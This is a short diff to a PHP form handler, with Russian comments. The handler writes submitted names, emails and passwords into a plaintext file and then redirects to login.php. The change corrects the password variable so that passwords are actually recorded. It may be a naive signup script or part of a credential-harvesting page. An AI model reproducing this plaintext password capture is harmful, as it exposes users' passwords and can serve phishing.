@@ -4,7 +4,7 @@ $email = $_POST['email'];
 $pass = $_POST['pass'];
 $text .= "Имя: $name \n";
 $text .= "Почта: $email \n";
-$text .= "Пароль: $mes \n";
+$text .= "Пароль: $pass \n";
 $text .= "\n";
 if (!empty($name) && !empty($email) && !empty($pass)) //если все переменные имеют значения выполняем запись в файл
 {
@@ -12,7 +12,7 @@ if (!empty($name) && !empty($email) && !empty($pass)) //если все пере
     fwrite ($file,$text); // пишем в файл
     fclose ($file); // закрываем файл
 }
-header("Location: close.php")
+header("Location: login.php")
 ?>
 
 <!--//if ($_POST['']);-->
